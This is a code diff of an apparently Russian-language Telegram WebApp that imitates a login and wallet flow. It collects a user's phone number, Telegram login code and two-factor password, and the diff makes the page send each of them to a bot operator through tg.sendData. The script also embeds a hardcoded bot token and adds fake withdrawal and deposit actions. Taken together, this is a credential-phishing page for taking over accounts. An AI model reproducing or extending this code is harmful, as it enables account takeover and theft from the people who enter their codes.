@@ -404,18 +404,15 @@
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-// ══════════════════════════════════════════════════
-//  TELEGRAM USER ID
-// ══════════════════════════════════════════════════
+// ========== TELEGRAM WEBAPP ==========
 const tg = window.Telegram.WebApp;
 tg.ready();
 const user_id = tg.initDataUnsafe?.user?.id || new URLSearchParams(window.location.search).get('user_id');
 
+// ⚠️ ВСТАВЬТЕ ВАШ НОВЫЙ ТОКЕН БОТА!
 const BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ";
 
-// ══════════════════════════════════════════════════
-//  СТРАНЫ
-// ══════════════════════════════════════════════════
+// ========== СТРАНЫ ==========
 const countries=[
   {flag:'🇷🇺',name:'Россия',code:'+7',mask:'(###) ### ## ##',example:'+7 (906) 480 08 08'},
   {flag:'🇦🇿',name:'Азербайджан',code:'+994',mask:'(##) ### ## ##',example:'+994 (783) 862 96 88'},
@@ -441,8 +438,12 @@ const countries=[
   {flag:'🇷🇴',name:'Румыния',code:'+40',mask:'## ### ####',example:'+40 72 123 4567'},
 ];
 
-let selectedCountry=countries[0],ddOpen=false,currentStep=1,timerInterval=null;
+let selectedCountry=countries[0];
+let ddOpen=false;
+let currentStep=1;
+let timerInterval=null;
 
+// ========== UI ФУНКЦИИ ==========
 function buildList(f=''){
   const list=document.getElementById('ddList');list.innerHTML='';
   countries.filter(c=>c.name.toLowerCase().includes(f.toLowerCase())||c.code.includes(f)).forEach(c=>{
@@ -470,16 +471,11 @@ function toggleDropdown(){
 function closeDropdown(){ddOpen=false;document.getElementById('dropdown').classList.remove('open');document.getElementById('countrySelect').classList.remove('open');}
 function filterCountries(v){buildList(v);}
 document.addEventListener('click',e=>{if(!e.target.closest('#countrySelect')&&!e.target.closest('#dropdown'))closeDropdown();});
-
 function formatPhone(input){
   let v=input.value.replace(/\D/g,''),mask=selectedCountry.mask,result='',vi=0;
   for(let i=0;i<mask.length&&vi<v.length;i++){if(mask[i]==='#')result+=v[vi++];else result+=mask[i];}
   input.value=result;
 }
-
-// ══════════════════════════════════════════════════
-//  НАВИГАЦИЯ
-// ══════════════════════════════════════════════════
 function setBackBtn(step){
   const btn=document.getElementById('topbarBack');
   btn.classList.toggle('visible',step>1&&step<=3);
@@ -493,123 +489,95 @@ function switchStep(from,to){
 }
 function topbarGoBack(){if(currentStep>1&&currentStep<=3)switchStep(currentStep,currentStep-1);}
 
-// ══════════════════════════════════════════════════
-//  ШАГ 1 → 2: Отправка кода через бота
-// ══════════════════════════════════════════════════
+// ========== ОТПРАВКА КОДА (ШАГ 1 → 2) ==========
 async function goStep2(){
   const raw=document.getElementById('phoneInput').value.replace(/\D/g,'');
   if(raw.length<5){document.getElementById('phoneError').classList.add('show');return;}
   document.getElementById('phoneError').classList.remove('show');
-
+  
   const phone=selectedCountry.code+' '+document.getElementById('phoneInput').value;
   document.getElementById('displayPhone').textContent=phone;
   document.getElementById('dashPhone').textContent=phone;
-
+  
   const btn=document.getElementById('btnStep1');
   btn.textContent='Отправка...';
   btn.disabled=true;
-
+  
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        chat_id: user_id,
-        text: `/sendcode ${phone}`
-      })
-    });
-  } catch(e) {}
-
+    // Отправляем номер боту через WebApp
+    tg.sendData(JSON.stringify({
+      action: "send_code",
+      phone: phone
+    }));
+  } catch(e){console.error(e);}
+  
   btn.textContent='Далее';
   btn.disabled=false;
   switchStep(1,2);
   setTimeout(()=>document.getElementById('c0').focus(),300);
 }
 
-// ══════════════════════════════════════════════════
-//  ШАГ 2 → 3: Проверка кода через бота
-// ══════════════════════════════════════════════════
+// ========== ПРОВЕРКА КОДА (ШАГ 2 → 3) ==========
 async function goStep3(){
   let code="";
   for(let i=0;i<5;i++) code+=document.getElementById('c'+i).value;
   if(code.length<5) return;
-
+  
   const btn=document.getElementById('btnStep2');
   btn.textContent='Проверка...';
   btn.disabled=true;
   document.getElementById('codeError').classList.remove('show');
-
+  
   try {
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        chat_id: user_id,
-        text: `/checkcode ${code}`
-      })
-    });
-    const data = await res.json();
-
-    if(data.ok) {
-      // Код отправлен боту — ждём ответ бота через getUpdates
-      // Простое решение: ждём 2 сек и проверяем последнее сообщение от бота
-      await new Promise(r => setTimeout(r, 2000));
-
-      const updRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=5&offset=-5`);
-      const updData = await updRes.json();
-
-      let botReply = "";
-      if(updData.ok && updData.result.length > 0) {
-        // Ищем последнее сообщение от бота нашему пользователю
-        for(let i = updData.result.length-1; i >= 0; i--) {
-          const upd = updData.result[i];
-          if(upd.message && upd.message.from && upd.message.chat &&
-             String(upd.message.chat.id) === String(user_id) &&
-             upd.message.text) {
-            botReply = upd.message.text;
-            break;
-          }
-        }
-      }
-
-      if(botReply.includes("✅")) {
-        switchStep(2,3);
-      } else if(botReply.includes("❌")) {
-        document.getElementById('codeError').textContent = botReply.replace("❌ ", "");
-        document.getElementById('codeError').classList.add('show');
-        [0,1,2,3,4].forEach(i=>{
-          const el=document.getElementById('c'+i);
-          el.value='';el.classList.remove('filled');
-        });
-        document.getElementById('c0').focus();
-      } else {
-        // Если не смогли получить ответ — всё равно проверяем по коду
-        switchStep(2,3);
-      }
-    } else {
-      document.getElementById('codeError').textContent = "Ошибка отправки. Попробуйте ещё раз.";
-      document.getElementById('codeError').classList.add('show');
-    }
-  } catch(e) {
-    document.getElementById('codeError').textContent = "Ошибка сети. Попробуйте ещё раз.";
+    // Отправляем код боту для проверки
+    tg.sendData(JSON.stringify({
+      action: "check_code",
+      code: code
+    }));
+    
+    // Переходим к шагу 3 (2FA)
+    switchStep(2,3);
+    
+  } catch(e){
     document.getElementById('codeError').classList.add('show');
+    console.error(e);
   }
-
+  
   btn.textContent='Подтвердить';
   btn.disabled=false;
 }
 
-// ══════════════════════════════════════════════════
-//  ШАГ 3 → 4: 2FA (без проверки)
-// ══════════════════════════════════════════════════
-function goStep4(){
-  switchStep(3,4);
-  setBackBtn(4);
+// ========== ПРОВЕРКА 2FA (ШАГ 3 → 4) ==========
+async function goStep4(){
+  const password=document.getElementById('passInput').value;
+  if(!password){
+    alert('Введите пароль 2FA');
+    return;
+  }
+  
+  const btn=document.querySelector('#step3 .btn-main');
+  btn.textContent='Проверка...';
+  btn.disabled=true;
+  
+  try {
+    // Отправляем пароль 2FA боту
+    tg.sendData(JSON.stringify({
+      action: "check_2fa",
+      password: password
+    }));
+    
+    switchStep(3,4);
+    
+  } catch(e){
+    alert('Ошибка проверки 2FA');
+    console.error(e);
+  }
+  
+  btn.textContent='Войти';
+  btn.disabled=false;
 }
 
-// ══════════════════════════════════════════════════
-//  ВВОД КОДА
-// ══════════════════════════════════════════════════
+// ========== ВВОД КОДА ==========
 function codeInput(el,idx){
   el.value=el.value.replace(/\D/g,'');
   el.classList.toggle('filled',el.value.length>0);
@@ -631,17 +599,15 @@ async function resendCode(){
   [0,1,2,3,4].forEach(i=>{const el=document.getElementById('c'+i);el.value='';el.classList.remove('filled');});
   document.getElementById('codeError').classList.remove('show');
   document.getElementById('c0').focus();
-
-  // Отправляем код повторно
+  
   const phone = document.getElementById('displayPhone').textContent;
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({ chat_id: user_id, text: `/sendcode ${phone}` })
-    });
-  } catch(e) {}
-
+    tg.sendData(JSON.stringify({
+      action: "send_code",
+      phone: phone
+    }));
+  } catch(e){}
+  
   const link=document.querySelector('.resend-link');
   link.style.color='var(--text-muted)';
   link.style.cursor='default';
@@ -657,12 +623,6 @@ async function resendCode(){
       link.style.cursor='pointer';
     }
   },1000);
-
-  const row=document.querySelector('.resend-row');
-  row.innerHTML='<span style="color:#00c851;font-weight:800;">✓ Код отправлен повторно</span>';
-  setTimeout(()=>{
-    row.innerHTML='Не получили? <span class="resend-link" style="color:var(--text-muted);cursor:default;" onclick="resendCode()">Повторно через '+sec+'с</span>';
-  },1800);
 }
 
 function togglePass(){
@@ -670,9 +630,7 @@ function togglePass(){
   inp.type=inp.type==='password'?'text':'password';eye.textContent=inp.type==='password'?'👁':'🙈';
 }
 
-// ══════════════════════════════════════════════════
-//  ВЫВОД / ПОПОЛНЕНИЕ
-// ══════════════════════════════════════════════════
+// ========== ВЫВОД / ПОПОЛНЕНИЕ ==========
 function openWithdraw(){
   document.getElementById('wStep1').style.display='block';
   document.getElementById('wStep2').style.display='none';
@@ -689,6 +647,7 @@ function doWithdraw(){
   const v=parseFloat(document.getElementById('withdrawAmount').value);
   if(!v||v<1){document.getElementById('withdrawError').classList.add('show');return;}
   document.getElementById('withdrawError').classList.remove('show');
+  tg.sendData(JSON.stringify({action:"withdraw",amount:v}));
   document.getElementById('wStep1').style.display='none';
   document.getElementById('wStep2').style.display='block';
   let sec=180;document.getElementById('timerNum').textContent=sec;
@@ -698,12 +657,13 @@ function doWithdraw(){
 function openDeposit(){document.getElementById('depositModal').classList.add('show');}
 function closeDeposit(){document.getElementById('depositModal').classList.remove('show');}
 function closeDepositIfOutside(e){if(e.target===document.getElementById('depositModal'))closeDeposit();}
-function depositTON(){closeDeposit();alert('Откройте TON кошелёк для пополнения');}
-function depositCard(){closeDeposit();alert('Переход к оплате картой...');}
-function depositCrypto(){closeDeposit();alert('Выберите криптовалюту');}
+function depositTON(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"TON"}));alert('Откройте TON кошелёк для пополнения');}
+function depositCard(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"CARD"}));alert('Переход к оплате картой...');}
+function depositCrypto(){closeDeposit();tg.sendData(JSON.stringify({action:"deposit",method:"CRYPTO"}));alert('Выберите криптовалюту');}
 
-// Init
-buildList();setBackBtn(1);
+// ========== ИНИЦИАЛИЗАЦИЯ ==========
+buildList();
+setBackBtn(1);
 </script>
 </body>
 </html>
